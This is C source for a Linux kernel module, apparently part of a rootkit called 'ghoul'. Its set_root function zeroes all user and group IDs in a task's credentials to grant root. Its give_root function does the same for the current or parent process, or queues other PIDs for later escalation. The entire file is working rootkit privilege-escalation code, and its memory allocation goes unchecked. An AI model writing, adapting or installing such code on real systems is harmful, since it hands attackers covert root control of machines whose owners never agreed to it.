#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include "privileges.h"

LIST_HEAD(pids_waiting_for_root);

void set_root(void)
{
    struct cred *creds;
    creds = prepare_creds();

    if (creds == NULL)
        return;
    
    pr_info("ghoul: giving root to PID %d\n", current->pid);

    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    commit_creds(creds);
}

void give_root(int pid)
{
    struct pid_list *pid_entry;

    // give root to current task
    if (pid == THIS_TASK || pid == current->pid) {
        set_root();
        return;
    }

    // request to give root to parent task - find its PID
    if (pid == PARENT_TASK)
        pid = current->parent->pid;
    
    // add PID to list of PIDs waiting for root
    pr_info("ghoul: scheduled request to give root to PID %d\n", pid);
    pid_entry = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
    pid_entry->pid = pid;
    list_add_tail(&pid_entry->list, &pids_waiting_for_root);
}